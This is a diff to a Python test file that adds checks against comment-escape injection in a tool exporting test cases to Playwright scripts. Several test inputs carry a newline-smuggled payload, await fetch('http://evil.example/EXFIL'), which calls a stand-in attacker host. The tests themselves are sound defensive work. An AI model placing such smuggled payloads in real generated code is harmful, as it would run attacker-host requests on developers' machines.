@@ -176,6 +176,40 @@ def main():
     # ---- 用例标题写进文件（test 名/注释）----
     assert "登录冒烟" in out, "用例标题应出现在生成文件中"
 
+    # ---- 安全：注释注入（换行逃逸 // 注释 → 实时执行代码）必须被封堵 ----
+    # desc/title/action/key 等来自其他成员/AI 生成的用例文本，被导出脚本在开发本机 `npx playwright test`
+    # 运行；若含换行则可逃出 // 行注释，把注入代码变成 live 语句（存储型注入 → 开发机执行）。
+    MARK = "http://evil.example/EXFIL"
+    payload = f"点登录\nawait fetch('{MARK}'); //"
+
+    def _no_live_injection(text: str):
+        # 含 MARK 的每一行都必须是注释（strip 后以 // 开头）；否则说明逃逸成 live 代码。
+        for ln in text.splitlines():
+            if MARK in ln:
+                assert ln.strip().startswith("//"), f"注入逃逸成 live 代码: {ln!r}"
+
+    # desc 注入
+    _no_live_injection(export_case_to_playwright(
+        _case([{"action": "click", "target": {"key": "loginSubmit"}, "desc": payload}]),
+        REGISTRY, VM_IFRAME))
+    # title 注入（写进文件头注释与 test 名）
+    _no_live_injection(export_case_to_playwright(
+        _case([{"action": "click", "target": {"key": "loginSubmit"}, "desc": "x"}], title=payload),
+        REGISTRY, VM_IFRAME))
+    # action 注入（写进 // stepN [action] 注释）
+    _no_live_injection(export_case_to_playwright(
+        _case([{"action": payload, "target": {"key": "loginSubmit"}, "desc": "x"}]),
+        REGISTRY, VM_IFRAME))
+    # 未登记 key 注入（写进 TODO 注释）
+    _no_live_injection(export_case_to_playwright(
+        _case([{"action": "click", "target": {"key": payload}, "desc": "x"}]),
+        REGISTRY, VM_IFRAME))
+    # steps/expected 注入（写进文件头注释）
+    _no_live_injection(export_case_to_playwright(
+        _case([{"action": "click", "target": {"key": "loginSubmit"}, "desc": "x"}],
+              steps=payload, expected=payload),
+        REGISTRY, VM_IFRAME))
+
     print("OK test_playwright_export")
 
 
